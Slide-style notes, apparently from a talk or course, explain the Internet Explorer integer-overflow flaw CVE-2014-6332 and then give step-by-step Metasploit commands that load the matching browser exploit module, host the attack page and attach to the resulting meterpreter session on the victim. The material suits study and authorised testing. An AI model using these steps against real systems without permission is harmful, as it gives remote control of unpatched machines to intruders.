# About the vulnerability

Called CVE-2014-6332

* Discovered 2014, affects Internet Explorer 3.0 to 11

* Can be exploited to run arbitary code through HTML
 - Code is executed with shell privilegies

* Integer overflow during array allocation

 - creates an array with wide limits, but small space allocated

 - memory can be accessed outside the array!

* Mitigated by updating Windows or IE
 - No patch is released for Windows XP

---

# Exploiting the vulnerability

A proof of concept exploitation tool for Metasploit has been published.

The tool works in 3 steps:

1. Create and resize an array to trigger the overflow exploit
 - Allows full memory access

2. Overwrite the memory flags that limit the script's privilegies
 - Allows the script to run in "God mode"
 - The script now has shell privilegies

3.  Execute the payload
 - Call back to Metasploit, starting a meterpreter session
---

# Using the exploit

* Start Metasploit:

```bash
msfconsole
```

* Load the exploitation module:

```bash
use exploit/windows/browser/ms14_064_ole_code_execution
```

- Additional options can be displayed using:

```bash
show options
```

* Run the exploit:

```bash
exploit
```

This hosts a page utilizing the exploit.

# Post exploitation

* Attach to the resulting meterpreter session:

```bash
sessions -i <sessionnumber>
```

* You now have access to the targeted system

Available commands and instructions can be displayed using:

```bash
help
```
